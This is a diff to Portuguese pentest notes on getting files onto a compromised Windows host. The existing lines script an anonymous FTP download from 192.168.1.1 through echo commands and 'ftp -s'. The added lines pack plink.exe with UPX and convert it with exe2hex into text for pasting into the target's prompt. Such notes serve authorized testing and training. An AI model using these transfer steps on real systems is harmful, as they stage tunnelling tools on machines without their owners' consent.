@@ -51,7 +51,7 @@ No WINDOWS:
 
 Em uma shell não interativa:
 
-    1) Criar um arquivo com o conteudo:
+    1) Criar um arquivo (ftp.txt) com o conteudo:
 
         echo open192.168.1.1 > ftp.txt
         echo USER anonymous >> ftp.txt
@@ -61,3 +61,20 @@ Em uma shell não interativa:
         echo QUIT >> ftp.txt
 
     2) ftp -v -n -s:ftp.txt
+
+# =============================================
+# Método HEX
+# =============================================
+
+# No linux
+# -------------------------------
+
+Primeiro utilizar o UPX para comprimir o binário.
+    upx -9 plink.exe
+
+Utilizando o exe2hex para gerar um "executavel" que utilizará o powershell.
+    exe2hex -x plink.exe -p plink.txt
+
+Depois copie e colo o conteudo do arquivo gerado na janela do prompt.
+
+
